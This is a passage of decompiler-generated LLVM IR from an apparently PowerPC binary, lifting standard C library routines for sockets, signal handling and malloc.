  store i32 268561424, i32* @lr, align 4
  %v2_1001ec0c = call i32 @__socketcall(i32 14, i32 %v2_1001ebf8)
  ret i32 %v2_1001ec0c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001ec34 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268561476, i32* @lr, align 4
  %v2_1001ec40 = call i32 @__socketcall(i32 1, i32 %v2_1001ec34)
  ret i32 %v2_1001ec40

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 1, 0, 8, 12, 7, 11, 10, 5, 4, 9, 6, 2, 3 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1001ec58 = load i32, i32* @lr, align 4
  store i32 %v0_1001ec58, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1001ec64 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1001ec74 = add i32 %tmp, 4
  store i32 %v1_1001ec74, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1001ec7c = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1001ec7c, i32* @r3, align 4
  br i1 %v3_1001ec64, label %dec_label_pc_1001eca4, label %dec_label_pc_1001ec84

dec_label_pc_1001ec84:                            ; preds = %entry
  %v2_1001ec84 = load i32, i32* %arg2, align 4
  store i32 %v2_1001ec84, i32* %r0.global-to-local, align 4
  store i32 268561552, i32* @lr, align 4
  %v0_1001ec8c = call i32 @memcpy()
  %v0_1001ec90 = load i32, i32* @r31, align 4
  %v1_1001ec90 = add i32 %v0_1001ec90, 132
  %v2_1001ec90 = inttoptr i32 %v1_1001ec90 to i32*
  %v3_1001ec90 = load i32, i32* %v2_1001ec90, align 4
  store i32 %v3_1001ec90, i32* %r0.global-to-local, align 4
  %v1_1001ec9c = add i32 %v0_1001ec90, 136
  %v2_1001ec9c = inttoptr i32 %v1_1001ec9c to i32*
  %v3_1001ec9c = load i32, i32* %v2_1001ec9c, align 4
  store i32 %v3_1001ec9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001eca4

dec_label_pc_1001eca4:                            ; preds = %entry, %dec_label_pc_1001ec84
  store i32 268561604, i32* @lr, align 4
  %v0_1001ecc0 = call i32 @__syscall_rt_sigaction()
  %v0_1001ecc4 = load i32, i32* @r30, align 4
  %v3_1001ecc4 = icmp eq i32 %v0_1001ecc4, 0
  store i32 %v0_1001ecc0, i32* @r31, align 4
  br i1 %v3_1001ecc4, label %dec_label_pc_1001ed00, label %dec_label_pc_1001ecd4

dec_label_pc_1001ecd4:                            ; preds = %dec_label_pc_1001eca4
  %v1_1001eccc = icmp slt i32 %v0_1001ecc0, 0
  %v1_1001ecd4 = add i32 %v0_1001ecc4, 4
  store i32 %v1_1001ecd4, i32* @r3, align 4
  %v2_1001ecd8 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1001ecd8, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1001eccc, label %dec_label_pc_1001ed00, label %dec_label_pc_1001ece4

dec_label_pc_1001ece4:                            ; preds = %dec_label_pc_1001ecd4
  %v3_1001ece4 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1001ece4, i32* %r0.global-to-local, align 4
  %v2_1001ece8 = inttoptr i32 %v0_1001ecc4 to i32*
  store i32 %v3_1001ece4, i32* %v2_1001ece8, align 4
  store i32 268561648, i32* @lr, align 4
  %v0_1001ecec = call i32 @memcpy()
  store i32 %tmp6, i32* @r9, align 4
  %v1_1001ecf8 = load i32, i32* @r30, align 4
  %v2_1001ecf8 = add i32 %v1_1001ecf8, 136
  %v3_1001ecf8 = inttoptr i32 %v2_1001ecf8 to i32*
  store i32 %tmp6, i32* %v3_1001ecf8, align 4
  %v0_1001ecfc = load i32, i32* %r0.global-to-local, align 4
  %v1_1001ecfc = load i32, i32* @r30, align 4
  %v2_1001ecfc = add i32 %v1_1001ecfc, 132
  %v3_1001ecfc = inttoptr i32 %v2_1001ecfc to i32*
  store i32 %v0_1001ecfc, i32* %v3_1001ecfc, align 4
  %v0_1001ed04.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001ed00

dec_label_pc_1001ed00:                            ; preds = %dec_label_pc_1001ecd4, %dec_label_pc_1001eca4, %dec_label_pc_1001ece4
  %v0_1001ed04 = phi i32 [ %v0_1001ecc0, %dec_label_pc_1001ecd4 ], [ %v0_1001ecc0, %dec_label_pc_1001eca4 ], [ %v0_1001ed04.pre, %dec_label_pc_1001ece4 ]
  store i32 %v0_1001ec58, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001ed04

; uselistorder directives
  uselistorder i32 %v0_1001ecc0, { 0, 1, 3, 2 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder label %dec_label_pc_1001ed00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001eca4, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1001ed48, label %dec_label_pc_1001ed34

dec_label_pc_1001ed34:                            ; preds = %entry
  %v0_1001ed34 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1001ed40 = inttoptr i32 %v0_1001ed34 to i32*
  store i32 22, i32* %v2_1001ed40, align 4
  %v0_1001ed54.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ed50

dec_label_pc_1001ed48:                            ; preds = %entry
  %v0_1001ed48 = call i32 @__sigaddset()
  store i32 %v0_1001ed48, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ed50

dec_label_pc_1001ed50:                            ; preds = %dec_label_pc_1001ed34, %dec_label_pc_1001ed48
  %v0_1001ed54 = phi i32 [ %v0_1001ed54.pre, %dec_label_pc_1001ed34 ], [ %v0_1001ed48, %dec_label_pc_1001ed48 ]
  ret i32 %v0_1001ed54

; uselistorder directives
  uselistorder label %dec_label_pc_1001ed50, { 1, 0 }
}

define i32 @__GI_sigdelset(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1001ed94, label %dec_label_pc_1001ed80

dec_label_pc_1001ed80:                            ; preds = %entry
  %v0_1001ed80 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1001ed8c = inttoptr i32 %v0_1001ed80 to i32*
  store i32 22, i32* %v2_1001ed8c, align 4
  %v0_1001eda0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ed9c

dec_label_pc_1001ed94:                            ; preds = %entry
  %v0_1001ed94 = call i32 @__sigdelset()
  store i32 %v0_1001ed94, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ed9c

dec_label_pc_1001ed9c:                            ; preds = %dec_label_pc_1001ed80, %dec_label_pc_1001ed94
  %v0_1001eda0 = phi i32 [ %v0_1001eda0.pre, %dec_label_pc_1001ed80 ], [ %v0_1001ed94, %dec_label_pc_1001ed94 ]
  ret i32 %v0_1001eda0

; uselistorder directives
  uselistorder label %dec_label_pc_1001ed9c, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268561864, i32* @lr, align 4
  %v0_1001edc4 = call i32 @__GI_memset()
  ret i32 0
}

define i32 @sigfillset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 255, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268561908, i32* @lr, align 4
  %v0_1001edf0 = call i32 @__GI_memset()
  ret i32 0
}

define i32 @sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1001ee38, label %dec_label_pc_1001ee24

dec_label_pc_1001ee24:                            ; preds = %entry
  %v0_1001ee24 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1001ee30 = inttoptr i32 %v0_1001ee24 to i32*
  store i32 22, i32* %v2_1001ee30, align 4
  %v0_1001ee44.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ee40

dec_label_pc_1001ee38:                            ; preds = %entry
  %v0_1001ee38 = call i32 @__sigismember()
  store i32 %v0_1001ee38, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ee40

dec_label_pc_1001ee40:                            ; preds = %dec_label_pc_1001ee24, %dec_label_pc_1001ee38
  %v0_1001ee44 = phi i32 [ %v0_1001ee44.pre, %dec_label_pc_1001ee24 ], [ %v0_1001ee38, %dec_label_pc_1001ee38 ]
  ret i32 %v0_1001ee44

; uselistorder directives
  uselistorder label %dec_label_pc_1001ee40, { 1, 0 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %v0_1001ee54 = load i32, i32* @r4, align 4
  %v3_1001ee54 = icmp eq i32 %v0_1001ee54, 0
  %v0_1001ee60 = load i32, i32* @r3, align 4
  %v0_1001ee68 = load i32, i32* @r31, align 4
  store i32 %v0_1001ee60, i32* @r31, align 4
  br i1 %v3_1001ee54, label %dec_label_pc_1001ee8c, label %dec_label_pc_1001ee7c

dec_label_pc_1001ee7c:                            ; preds = %entry
  %v1_1001ee60 = add i32 %v0_1001ee60, 452
  store i32 ptrtoint (i32* @global_var_1001ee80.1231 to i32), i32* @lr, align 4
  %v3_1001ee7c = call i32 @__GI_sigprocmask(i32 0, i32 0, i32 %v1_1001ee60)
  %v3_1001ee84 = icmp eq i32 %v3_1001ee7c, 0
  br i1 %v3_1001ee84, label %dec_label_pc_1001ee90, label %dec_label_pc_1001ee8c

dec_label_pc_1001ee8c:                            ; preds = %dec_label_pc_1001ee7c, %entry
  br label %dec_label_pc_1001ee90

dec_label_pc_1001ee90:                            ; preds = %dec_label_pc_1001ee7c, %dec_label_pc_1001ee8c
  %v0_1001ee90 = phi i32 [ 1, %dec_label_pc_1001ee7c ], [ 0, %dec_label_pc_1001ee8c ]
  %v1_1001ee90 = load i32, i32* @r31, align 4
  %v2_1001ee90 = add i32 %v1_1001ee90, 448
  %v3_1001ee90 = inttoptr i32 %v2_1001ee90 to i32*
  store i32 %v0_1001ee90, i32* %v3_1001ee90, align 4
  store i32 %v0_1001ee68, i32* @r31, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1001ee60, { 1, 0 }
  uselistorder i32 448, { 2, 0, 1 }
  uselistorder i32 452, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001ee90, { 1, 0 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1001eeac = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1001eeac, label %dec_label_pc_1001eed8, label %dec_label_pc_1001eec8

dec_label_pc_1001eec8:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_1001eed8, label %dec_label_pc_1001eed0

dec_label_pc_1001eed0:                            ; preds = %dec_label_pc_1001eec8
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_1001ef08.lr.ph, label %dec_label_pc_1001eed8

dec_label_pc_1001eed8:                            ; preds = %dec_label_pc_1001eed0, %dec_label_pc_1001eec8, %entry
  %v0_1001eed8 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1001eee4 = inttoptr i32 %v0_1001eed8 to i32*
  store i32 22, i32* %v2_1001eee4, align 4
  %v0_1001ef78.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ef74

dec_label_pc_1001ef08.lr.ph:                      ; preds = %dec_label_pc_1001eed0
  %v2_1001eef8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1001eef8, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1001ef0822 = add i32 %v2_1001eef8, 128
  %v3_1001ef0823 = inttoptr i32 %v2_1001ef0822 to i32*
  store i32 0, i32* %v3_1001ef0823, align 4
  %v0_1001ef0c24 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001ef0c25 = add i32 %v0_1001ef0c24, -1
  store i32 %v1_1001ef0c25, i32* %r11.global-to-local, align 4
  %v1_1001ef1026 = mul i32 %v1_1001ef0c25, 4
  %v1_1001ef1427 = load i32, i32* @r8, align 4
  %v2_1001ef1428 = add i32 %v1_1001ef1427, %v1_1001ef1026
  store i32 %v2_1001ef1428, i32* %r9.global-to-local, align 4
  %v0_1001ef1829 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001ef1830 = add i32 %v0_1001ef1829, -1
  store i32 %v1_1001ef1830, i32* %ctr.global-to-local, align 4
  %v2_1001ef1831 = icmp eq i32 %v1_1001ef1830, 0
  br i1 %v2_1001ef1831, label %dec_label_pc_1001ef1c, label %dec_label_pc_1001ef08.dec_label_pc_1001ef08_crit_edge

dec_label_pc_1001ef08.dec_label_pc_1001ef08_crit_edge: ; preds = %dec_label_pc_1001ef08.lr.ph, %dec_label_pc_1001ef08.dec_label_pc_1001ef08_crit_edge
  %v2_1001ef1432 = phi i32 [ %v2_1001ef14, %dec_label_pc_1001ef08.dec_label_pc_1001ef08_crit_edge ], [ %v2_1001ef1428, %dec_label_pc_1001ef08.lr.ph ]
  %v0_1001ef08.pre = load i32, i32* @r10, align 4
  %v2_1001ef08 = add i32 %v2_1001ef1432, 4
  %v3_1001ef08 = inttoptr i32 %v2_1001ef08 to i32*
  store i32 %v0_1001ef08.pre, i32* %v3_1001ef08, align 4
  %v0_1001ef0c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001ef0c = add i32 %v0_1001ef0c, -1
  store i32 %v1_1001ef0c, i32* %r11.global-to-local, align 4
  %v1_1001ef10 = mul i32 %v1_1001ef0c, 4
  %v1_1001ef14 = load i32, i32* @r8, align 4
  %v2_1001ef14 = add i32 %v1_1001ef14, %v1_1001ef10
  store i32 %v2_1001ef14, i32* %r9.global-to-local, align 4
  %v0_1001ef18 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001ef18 = add i32 %v0_1001ef18, -1
  store i32 %v1_1001ef18, i32* %ctr.global-to-local, align 4
  %v2_1001ef18 = icmp eq i32 %v1_1001ef18, 0
  br i1 %v2_1001ef18, label %dec_label_pc_1001ef1c, label %dec_label_pc_1001ef08.dec_label_pc_1001ef08_crit_edge

dec_label_pc_1001ef1c:                            ; preds = %dec_label_pc_1001ef08.dec_label_pc_1001ef08_crit_edge, %dec_label_pc_1001ef08.lr.ph
  %v0_1001ef20.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_1001ef1c = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_1001ef1c, i32* @r3, align 4
  store i32 %v0_1001ef20.pre, i32* @r4, align 4
  %v0_1001ef24 = call i32 @__sigaddset()
  %v1_1001ef28 = icmp slt i32 %v0_1001ef24, 0
  br i1 %v1_1001ef28, label %dec_label_pc_1001ef70, label %dec_label_pc_1001ef30

dec_label_pc_1001ef30:                            ; preds = %dec_label_pc_1001ef1c
  %v0_1001ef34 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_1001ef34, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1004edc0.1233 to i32), i32* @r3, align 4
  %v0_1001ef3c = call i32 @__sigismember()
  %v2_1001ef48 = ptrtoint i32* %stack_var_-156 to i32
  store i32 268562272, i32* @lr, align 4
  %v4_1001ef5c = call i32 @__GI_sigaction(i32 %v0_1001ef34, i32* nonnull %stack_var_-296, i32 %v2_1001ef48)
  %v1_1001ef60 = icmp slt i32 %v4_1001ef5c, 0
  br i1 %v1_1001ef60, label %dec_label_pc_1001ef70, label %dec_label_pc_1001ef68

dec_label_pc_1001ef68:                            ; preds = %dec_label_pc_1001ef30
  %v3_1001ef68 = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_1001ef68, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ef74

dec_label_pc_1001ef70:                            ; preds = %dec_label_pc_1001ef30, %dec_label_pc_1001ef1c
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001ef74

dec_label_pc_1001ef74:                            ; preds = %dec_label_pc_1001ef68, %dec_label_pc_1001eed8, %dec_label_pc_1001ef70
  %v0_1001ef78 = phi i32 [ %v3_1001ef68, %dec_label_pc_1001ef68 ], [ %v0_1001ef78.pre, %dec_label_pc_1001eed8 ], [ -1, %dec_label_pc_1001ef70 ]
  ret i32 %v0_1001ef78

; uselistorder directives
  uselistorder i32 %v1_1001ef18, { 1, 0 }
  uselistorder i32 %v2_1001ef14, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 2, 0, 1 }
  uselistorder i32 65, { 1, 2, 6, 8, 9, 7, 4, 5, 3, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001ef74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001ef08.dec_label_pc_1001ef08_crit_edge, { 1, 0 }
}

define i32 @__sigismember() local_unnamed_addr {
entry:
  %v0_1001ef8c = load i32, i32* @r4, align 4
  %v1_1001ef8c = add i32 %v0_1001ef8c, -1
  %v1_1001ef90 = call i32 @__asm_rlwinm(i32 %v1_1001ef8c, i32 29, i32 3, i32 29)
  %v1_1001ef94 = urem i32 %v1_1001ef8c, 32
  %v0_1001ef98 = load i32, i32* @r3, align 4
  %v2_1001ef98 = add i32 %v0_1001ef98, %v1_1001ef90
  %v3_1001ef98 = inttoptr i32 %v2_1001ef98 to i32*
  %v4_1001ef98 = load i32, i32* %v3_1001ef98, align 4
  %v3_1001efa0 = shl i32 1, %v1_1001ef94
  %v2_1001efa4 = and i32 %v4_1001ef98, %v3_1001efa0
  %v2_1001efa8 = icmp ne i32 %v2_1001efa4, 0
  %v5_1001efac = zext i1 %v2_1001efa8 to i32
  ret i32 %v5_1001efac
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1001efb4 = load i32, i32* @r4, align 4
  %v1_1001efb4 = add i32 %v0_1001efb4, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1001efbc = call i32 @__asm_rlwinm(i32 %v1_1001efb4, i32 29, i32 3, i32 29)
  store i32 %v1_1001efbc, i32* @r11, align 4
  %v1_1001efc0 = urem i32 %v1_1001efb4, 32
  %v1_1001efc4 = load i32, i32* @r3, align 4
  %v2_1001efc4 = add i32 %v1_1001efc4, %v1_1001efbc
  %v3_1001efc4 = inttoptr i32 %v2_1001efc4 to i32*
  %v4_1001efc4 = load i32, i32* %v3_1001efc4, align 4
  %v0_1001efc8 = load i32, i32* %r0.global-to-local, align 4
  %v3_1001efc8 = shl i32 %v0_1001efc8, %v1_1001efc0
  store i32 %v3_1001efc8, i32* %r0.global-to-local, align 4
  %v2_1001efcc = or i32 %v3_1001efc8, %v4_1001efc4
  store i32 %v2_1001efcc, i32* %v3_1001efc4, align 4
  ret i32 0
}

define i32 @__sigdelset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1001efdc = load i32, i32* @r4, align 4
  %v1_1001efdc = add i32 %v0_1001efdc, -1
  store i32 -2, i32* %r0.global-to-local, align 4
  %v1_1001efe4 = call i32 @__asm_rlwinm(i32 %v1_1001efdc, i32 29, i32 3, i32 29)
  store i32 %v1_1001efe4, i32* @r11, align 4
  %v1_1001efe8 = urem i32 %v1_1001efdc, 32
  %v1_1001efec = load i32, i32* @r3, align 4
  %v2_1001efec = add i32 %v1_1001efec, %v1_1001efe4
  %v3_1001efec = inttoptr i32 %v2_1001efec to i32*
  %v4_1001efec = load i32, i32* %v3_1001efec, align 4
  %v0_1001eff0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1001eff0 = shl i32 %v0_1001eff0, %v1_1001efe8
  %v4_1001eff0 = sub nsw i32 32, %v1_1001efe8
  %v5_1001eff0 = lshr i32 %v0_1001eff0, %v4_1001eff0
  %v6_1001eff0 = or i32 %v5_1001eff0, %v3_1001eff0
  store i32 %v6_1001eff0, i32* %r0.global-to-local, align 4
  %v2_1001eff4 = and i32 %v6_1001eff0, %v4_1001efec
  store i32 %v2_1001eff4, i32* %v3_1001efec, align 4
  ret i32 0
}

define i32 @malloc() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1001f004 = load i32, i32* @r3, align 4
  %v3_1001f004 = icmp eq i32 %v0_1001f004, 0
  br i1 %v3_1001f004, label %dec_label_pc_1001f01c, label %dec_label_pc_1001f020

dec_label_pc_1001f01c:                            ; preds = %entry
  br label %dec_label_pc_1001f020

dec_label_pc_1001f020:                            ; preds = %entry, %dec_label_pc_1001f01c
  %v0_1001f030 = phi i32 [ 1, %dec_label_pc_1001f01c ], [ %v0_1001f004, %entry ]
  %v3_1001f024 = icmp ugt i32 %v0_1001f030, -8
  br i1 %v3_1001f024, label %dec_label_pc_1001f134, label %dec_label_pc_1001f02c

dec_label_pc_1001f02c:                            ; preds = %dec_label_pc_1001f020
  %v1_1001f030 = add i32 %v0_1001f030, 4
  store i32 ptrtoint (i32* @global_var_1004da34.971 to i32), i32* @r29, align 4
  store i32 %v1_1001f030, i32* %stack_var_-40, align 4
  store i32 268562500, i32* @lr, align 4
  %v1_1001f040 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004da34.971 to i32))
  %v2_1001f048 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1001f050 = call i32 @__heap_alloc(i32* inttoptr (i32 268718416 to i32*), i32 %v2_1001f048)
  store i32 %v3_1001f050, i32* @r31, align 4
  %v0_1001f058 = load i32, i32* @r29, align 4
  store i32 %v0_1001f058, i32* @r3, align 4
  store i32 268562528, i32* @lr, align 4
  %v0_1001f05c = call i32 @pthread_mutex_unlock()
  %v0_1001f060 = load i32, i32* @r31, align 4
  %v3_1001f060 = icmp eq i32 %v0_1001f060, 0
  br i1 %v3_1001f060, label %dec_label_pc_1001f068, label %dec_label_pc_1001f118.thread

dec_label_pc_1001f118.thread:                     ; preds = %dec_label_pc_1001f02c
  br label %dec_label_pc_1001f12c

dec_label_pc_1001f068:                            ; preds = %dec_label_pc_1001f02c
  %v3_1001f06c = load i32, i32* @global_var_10045254.1006, align 4
  %v3_1001f070 = load i32, i32* %stack_var_-40, align 4
  %v2_1001f074 = icmp ult i32 %v3_1001f070, %v3_1001f06c
  br i1 %v2_1001f074, label %dec_label_pc_1001f08c, label %dec_label_pc_1001f07c

dec_label_pc_1001f07c:                            ; preds = %dec_label_pc_1001f068
  %v2_1001f07c = add i32 %v3_1001f06c, -1
  %v1_1001f084 = add i32 %v2_1001f07c, %v3_1001f070
  br label %dec_label_pc_1001f08c

dec_label_pc_1001f08c:                            ; preds = %dec_label_pc_1001f068, %dec_label_pc_1001f07c
  %storemerge = phi i32 [ %v1_1001f084, %dec_label_pc_1001f07c ], [ %v3_1001f070, %dec_label_pc_1001f068 ]
  store i32 %storemerge, i32* @r9, align 4
  store i32 268562588, i32* @lr, align 4
  %v1_1001f098 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004ee40.970 to i32))
  %v0_1001f09c = load i32, i32* @r31, align 4
  store i32 268562596, i32* @lr, align 4
  %v1_1001f0a0 = call i32 @__GI_sbrk(i32 %v0_1001f09c)
  %v3_1001f0a4 = icmp eq i32 %v1_1001f0a0, -1
  br i1 %v3_1001f0a4, label %dec_label_pc_1001f0c4, label %dec_label_pc_1001f0ac

dec_label_pc_1001f0ac:                            ; preds = %dec_label_pc_1001f08c
  %v1_1001f0ac = add i32 %v1_1001f0a0, 3
  %v1_1001f0b0 = call i32 @__asm_rlwinm(i32 %v1_1001f0ac, i32 0, i32 0, i32 29)
  store i32 %v1_1001f0b0, i32* @r30, align 4
  %v4_1001f0b4 = icmp eq i32 %v1_1001f0b0, %v1_1001f0a0
  br i1 %v4_1001f0b4, label %dec_label_pc_1001f0c4, label %dec_label_pc_1001f0bc

dec_label_pc_1001f0bc:                            ; preds = %dec_label_pc_1001f0ac
  %v2_1001f0bc = sub i32 %v1_1001f0b0, %v1_1001f0a0
  store i32 268562628, i32* @lr, align 4
  %v1_1001f0c0 = call i32 @__GI_sbrk(i32 %v2_1001f0bc)
  br label %dec_label_pc_1001f0c4

dec_label_pc_1001f0c4:                            ; preds = %dec_label_pc_1001f0ac, %dec_label_pc_1001f08c, %dec_label_pc_1001f0bc
  store i32 ptrtoint (i32* @global_var_1004ee40.970 to i32), i32* @r3, align 4
  store i32 268562640, i32* @lr, align 4
  %v0_1001f0cc = call i32 @pthread_mutex_unlock()
  %v0_1001f0d0 = load i32, i32* @r30, align 4
  %v3_1001f0d0 = icmp eq i32 %v0_1001f0d0, -1
  br i1 %v3_1001f0d0, label %dec_label_pc_1001f134, label %dec_label_pc_1001f118

dec_label_pc_1001f118:                            ; preds = %dec_label_pc_1001f0c4
  store i32 ptrtoint (i32* @global_var_1004da34.971 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10045150 to i32), i32* @r29, align 4
  store i32 268562672, i32* @lr, align 4
  %v1_1001f0ec = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004da34.971 to i32))
  %v0_1001f0f0 = load i32, i32* @r31, align 4
  %v0_1001f0f4 = load i32, i32* @r30, align 4
  %v0_1001f0f8 = load i32, i32* @r29, align 4
  store i32 268562688, i32* @lr, align 4
  %v3_1001f0fc = inttoptr i32 %v0_1001f0f8 to i32*
  %v4_1001f0fc = call i32 @__heap_free(i32* %v3_1001f0fc, i32 %v0_1001f0f4, i32 %v0_1001f0f0)
  %v0_1001f100 = load i32, i32* @r29, align 4
  %v2_1001f108 = inttoptr i32 %v0_1001f100 to i32*
  %v3_1001f108 = call i32 @__heap_alloc(i32* %v2_1001f108, i32 %v2_1001f048)
  store i32 %v3_1001f108, i32* @r31, align 4
  %v0_1001f110 = load i32, i32* @r28, align 4
  store i32 %v0_1001f110, i32* @r3, align 4
  store i32 268562712, i32* @lr, align 4
  %v0_1001f114 = call i32 @pthread_mutex_unlock()
  %v0_1001f118.pre = load i32, i32* @r31, align 4
  %v3_1001f118 = icmp eq i32 %v0_1001f118.pre, 0
  br i1 %v3_1001f118, label %dec_label_pc_1001f12c.thread, label %dec_label_pc_1001f12c

dec_label_pc_1001f12c.thread:                     ; preds = %dec_label_pc_1001f118
  br label %dec_label_pc_1001f134

dec_label_pc_1001f12c:                            ; preds = %dec_label_pc_1001f118, %dec_label_pc_1001f118.thread
  %v0_1001f12c.pr6 = phi i32 [ %v0_1001f060, %dec_label_pc_1001f118.thread ], [ %v0_1001f118.pre, %dec_label_pc_1001f118 ]
  %v3_1001f120 = load i32, i32* %stack_var_-40, align 4
  %v2_1001f124 = inttoptr i32 %v0_1001f12c.pr6 to i32*
  store i32 %v3_1001f120, i32* %v2_1001f124, align 4
  %v0_1001f128 = load i32, i32* @r31, align 4
  %v1_1001f128 = add i32 %v0_1001f128, 4
  store i32 %v1_1001f128, i32* @r31, align 4
  %v3_1001f12c = icmp eq i32 %v1_1001f128, 0
  br i1 %v3_1001f12c, label %dec_label_pc_1001f134, label %dec_label_pc_1001f144

dec_label_pc_1001f134:                            ; preds = %dec_label_pc_1001f12c.thread, %dec_label_pc_1001f12c, %dec_label_pc_1001f0c4, %dec_label_pc_1001f020
  %v0_1001f134 = call i32 @__errno_location()
  %v2_1001f13c = inttoptr i32 %v0_1001f134 to i32*
  store i32 12, i32* %v2_1001f13c, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1001f144

dec_label_pc_1001f144:                            ; preds = %dec_label_pc_1001f12c, %dec_label_pc_1001f134
  %v0_1001f148 = phi i32 [ %v1_1001f128, %dec_label_pc_1001f12c ], [ 0, %dec_label_pc_1001f134 ]
  ret i32 %v0_1001f148

; uselistorder directives
  uselistorder i32 %v1_1001f128, { 1, 0, 2 }
